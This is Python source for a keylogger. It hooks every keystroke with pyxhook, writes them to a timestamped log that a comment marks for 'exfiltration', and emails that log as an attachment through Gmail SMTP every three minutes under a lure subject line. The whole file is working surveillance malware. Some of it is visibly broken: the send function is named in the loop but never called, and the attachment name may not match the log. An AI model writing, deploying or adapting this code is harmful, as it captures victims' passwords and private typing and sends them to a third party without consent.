# Importing the required libraries

import os
from datetime import datetime
import pyxhook
import smtplib
import ssl
import email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

port = 465 # For SSL connection
smtp_server = "smtp.gmail.com" 
sender_email = "sender@gmail.com" # Change this to the email you want to send from!
receiver_email = "receiver@gmail.com" # Change this to the email you are sending this to!
password = "password" # Change this to the password being used for the account.
subject = "!This email has an important attachment!"
body = "Check out the attachment!"
data = ""

## Initializing 
def main():
    # Defining file name for later exfiltration
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
   # Logging function focusing on events
    def onKeyPress(event):
        with open(log_file, "a") as f:
            if event.Key == 'P_Enter' :
              f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}") # To Write to the file and converting ascii to characters that are readable
# Should a keyboard interuppt occur
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = onKeyPress

    new_hook.HookKeyboard()

    try:
        new_hook.start()
    except KeyboardInterrupt:
        new_hook.cancel()
        pass
    except Exception as exc:
        msg = f"Error while catching events:\n {exc}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")
        
    def sendEmail(): # To create the email to be sent 
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
            
        message.attach(MIMEText(body, "plain"))
        filename = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

        with open (filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            
        encoders.encode_base64(part) # Encode file in ASCII characters
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )

        message.attach(part)
        text = message.as_string()

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)

# Have an email be sent with a log file every 3 minutes
    next_run = (3 - (time.localtime().tm_min % 3) + time.localtime().tm_min)%60
    while True:
        now = time.localtime()

        if next_run == now.tm_min:
            print("Checking the time???")
            sendEmail

            next_run=(3 - (time.localtime().tm_min % 3) + time.localtime().tm_min)%60
        time.sleep(1)

if __name__ == "__main__":
    main()
